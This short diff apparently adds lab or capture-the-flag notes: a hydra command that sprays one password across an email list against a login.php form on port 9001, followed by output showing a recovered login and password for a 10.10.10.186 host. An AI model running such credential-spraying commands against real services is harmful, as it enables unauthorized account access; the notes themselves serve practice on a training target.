@@ -1,0 +1,3 @@
+hydra -L emailList.txt -p 'Quick4cc3$$' -s 9001 $IP http-post-form "/login.php:email=^USER^&password=^PASS^:Invalid Credentials"
+
+//result:[9001][http-post-form] host: 10.10.10.186   login: elisa@wink.co.uk   password: Quick4cc3$$
